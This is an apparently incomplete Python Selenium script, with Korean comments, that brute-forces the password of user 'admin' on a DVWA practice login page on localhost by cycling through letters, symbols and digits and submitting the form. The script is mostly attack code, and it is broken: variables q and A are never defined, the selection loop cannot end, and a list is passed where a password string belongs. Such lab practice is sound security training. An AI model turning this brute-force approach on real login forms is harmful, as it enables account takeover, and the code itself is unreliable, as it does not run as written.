
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
import time
import random
import string
from _ast import If

driver = webdriver.Chrome(ChromeDriverManager().install())
driver.get('http://localhost/3.dvwa/1.brutefource/0.get/1-3.bruteforce-GET.php')

list1=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"
      ,"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]

list2=['~','!','@','$','%','^','&','*','(',')','-','_','=','+','|','/',"\'","\\",'<','>','?',',','.',"\""]
#자리잡고
li3=["1","2","3","4","5","6","7","8","9","0"]
li4=[]
w=True
while (w==True):
    if (q==1):
        li4=list1
        w=False
    elif (q==2):
        li4=list1+list2
        w=False
    elif (q==3):
        li4=list1+li3
        w=False
    elif (q==4):
        li4=list1+list2+li3
        w=False
    else:
        print("입력 외의 값입니다\n지정된 값 중에서 골라주세요\n")
        w=True


list3=[]
list4=[]
for i in range(A):
    list3.append(list1[0])
 
#문자가 1자 일때
def fir0(x):
    list4=[]
    x=-x
    for i2 in range(len(li4)):
        list3[x]=li4[i2]
        print("현재 대입하는 문자열")
        list4.append("".join(list3))
        print(list4)
        id = driver.find_element_by_name('username')
        id.send_keys("admin")
        pw = driver.find_element_by_name('password')
        pw.send_keys(list3)
        Search = driver.find_element_by_xpath('/html/body/div/div/div/div/form/input[4]')  
        Search.click()   
        list4=[]     



